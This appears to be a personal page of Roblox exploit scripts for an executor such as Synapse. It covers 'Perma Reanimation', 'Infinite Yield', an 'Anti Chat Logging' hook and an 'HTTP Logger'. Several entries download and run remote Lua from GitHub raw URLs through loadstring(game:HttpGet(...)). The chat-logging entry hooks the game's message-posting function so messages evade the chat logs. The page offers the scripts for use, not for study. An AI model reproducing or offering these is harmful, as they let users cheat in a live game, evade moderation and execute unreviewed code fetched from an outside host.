## yth0z's stuff

### Perma Reanimation

```markdown
Bypass = "death"
loadstring(game:HttpGet('https://raw.githubusercontent.com/BulletAllah/c/main/perma.lua'))()

for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") then
game:GetService("RunService").Heartbeat:connect(function()
v.Velocity = Vector3.new(25.045,0,0)
end)
end
end

for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("Accessory") then
game:GetService("RunService").Heartbeat:connect(function()
v.Handle.Velocity = Vector3.new(25.045,0,0)
end)
end
end
```

### Infinite Yield

```markdown
loadstring(game:HttpGet("https://raw.githubusercontent.com/BulletAllah/c/main/iy.lua", true))()
```

### Anti Chat Logging (Synapse Only)

```markdown
local CloneFunction = clonefunction
local CheckCaller = CloneFunction(checkcaller)
local HookFunction = CloneFunction(hookfunction)
local LocalPlayer = game.Players.PlayerAdded:wait()

local PostMessage = require(LocalPlayer:WaitForChild("PlayerScripts", 1/0):WaitForChild("ChatScript", 1/0):WaitForChild("ChatMain", 1/0)).MessagePosted
getgenv().MessageEvent = Instance.new("BindableEvent")

local OldFunctionHook
local PostMessageHook = function(self, msg)
   if not CheckCaller() and self == PostMessage then
       MessageEvent:Fire(msg)
       return
   end
   return OldFunctionHook(self, msg)
end
OldFunctionHook = HookFunction(PostMessage.fire, PostMessageHook)
```

### HTTP Logger

loadstring(game:HttpGet("https://raw.githubusercontent.com/BulletAllah/c/main/logger.lua", true))()
